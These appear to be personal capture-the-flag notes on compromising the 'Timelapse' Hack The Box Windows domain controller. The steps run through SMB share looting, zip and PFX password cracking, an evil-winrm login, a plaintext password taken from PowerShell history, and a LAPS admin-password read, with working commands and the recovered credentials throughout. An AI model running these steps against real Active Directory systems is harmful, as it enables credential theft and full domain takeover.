box information::
name: timelapse
OS: Windows
IP: 10.10.11.152

NMAP::
nmap -Pn -sC -sV 10.10.11.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 13:34 EDT
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.13s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-05-08 01:51:22Z) **TAKE INTO ACCOUNT TIME**
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h16m54s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-05-08T01:51:43
|_  start_date: N/A

-sU::
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

DIR:: no HTTP

rpcdump.py::
Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol

hydra::
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>

msf6 auxiliary(scanner/dcerpc/tcp_dcerpc_auditor) > run
10.10.11.152 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000076070000
10.10.11.152 - UUID afa8bd80-7d8a-11c9-bef4-08002b102989 1.0 OPEN VIA 135 ACCESS GRANTED 000002000d0000000d00000004000200080002000c0002001000020014000200180002001c0002002000020024000200280002002c00020030000200340002000883afe11f5dc91191a408002b14a0fa0300000084650a0b0f9ecf11a3cf00805f68cb1b0100010026b5551d37c1c546ab79638f2a68e869010000007f0bfe64f59e5345a7db9a197577755401000000e6730ce6f988cf119af10020af6e72f402000000c4fefc9960521b10bbcb00aa0021347a00000000609ee7b9523dce11aaa100006901293f000002001e242f412ac1ce11abff0020af6e7a17000002003601000000000000c0000000000000460000000072eef3c67eced111b71e00c04fc3111a01000000b84a9f4d1c7dcf11861e0020af6e7c5700000000a001000000000000c0000000000000460000000079a140cbe120f04397fb3c5c6ff37ec30000000000000000
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/smb/smb_lookupsid) > set rhosts 10.10.11.152
[*] 10.10.11.152:445      - PIPE(LSARPC) LOCAL(TIMELAPSE - 5-21-671920749-559770252-3318990721) DOMAIN(TIMELAPSE - 5-21-671920749-559770252-3318990721)
USERS: Administrator RID=500,Guest RID=501,krbtgt RID=502, DC01$ RID=1000
SEE ![user_sids](Screenshots/timelapse.smb_lookupsid.png)

rpcclient.py -U "" -N 10.10.11.152: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
rpcclient $> lsaquery
Domain Name: TIMELAPSE **DC NAME**
Domain Sid: S-1-5-21-671920749-559770252-3318990721

smbclient:: no anonymous login. SHARES:: ADMIN,C,IPC,NETLOGON,Shares,SYSVOL
    smbclient \\\\10.10.11.152\\Share
        get /Dev/winrm_backup.zip
        fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt                                                    130 ⨯
            PASSWORD FOUND!!!!: pw == supremelegacy
            legacyy@timelapse.htb
                211025140552Z
                311025141552Z0

`pfx2john legaccy_dev_auth > legacyy_hash`
John will not work by default:
A John rule must be created.
`john -w=/usr/share/wordlists/rockyou.txt legacyy_pfx_hash --rule /usr/share/john/rules/rockyou-30000.rule `

CREDS: ??
legacyy:thuglegacy

extract info from .pfx::
`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes`
    *open _hash file with thuglegacy as PW.
    *output will create .pem file (key)
##TODO: Learn how to obtain a CERT and KEY from .pem file.##

evil-winrm::
    `evil-winrm -S -k legaccykey.cert -c legacy.cert -i 10.10.11.152 `
    cd C:\Users\legacyy\Desktop && cat user.txt::
        `56ce425e96e5882589c74b1a5febb93d`

PrivESC::
    run WinPEAS.exe (learn how to escape "This script contains malicious content and has been blocked by your antivirus software.")
    C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
        shows ConsoleHost_history.txt::
`txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit`

```
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cd C:\Users
*Evil-WinRM* PS C:\Users> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
*Evil-WinRM* PS C:\Users> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
*Evil-WinRM* PS C:\Users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) ## Save variables
*Evil-WinRM* PS C:\Users>  invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}  #splice timelaspe w svc_deploy
timelapse\svc_deploy

C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {hostname}
dc01 # using known keys/variables we are able to "splice" users.

*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /priv} #show privs of account
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /user} #Show SID of spliced user
USER INFORMATION
----------------
User Name            SID
==================== ============================================
timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103
```

```
*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes
Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/8/2022 11:13:44 PM
Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

because user is part of "LAPS_Readers" we know they can read "ms-MCs-AdmPwd"

```
*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
PSComputerName              : localhost
RunspaceId                  : 3cef4308-5279-4732-af8b-3d94cc884d1b
DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : 5158n4jrHNiA6PRm,@L,)VN8 #ADMIN PWD::
ms-Mcs-AdmPwdExpirationTime : 132969704895250781
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

PSComputerName    : localhost
RunspaceId        : 3cef4308-5279-4732-af8b-3d94cc884d1b
DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
SID               : S-1-5-21-671920749-559770252-3318990721-1606
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : 3cef4308-5279-4732-af8b-3d94cc884d1b
DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
SID               : S-1-5-21-671920749-559770252-3318990721-1607
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : 3cef4308-5279-4732-af8b-3d94cc884d1b
DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
SID               : S-1-5-21-671920749-559770252-3318990721-1608
UserPrincipalName :

```
*Evil-WinRM* PS C:\Users\TRX\Desktop> cat root.txt
cca6677941cd9bb8be784a99f7a9f7a7



`ntpdate -q 10.10.11.152: 2022-05-08 22:55:57.690685 (-0400) +29815.550491 +/- 0.154118 10.10.11.152 s1 no-leap `
^^Date on Kerberos server^^

Kerbrute_linux_amd64 

https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#rdp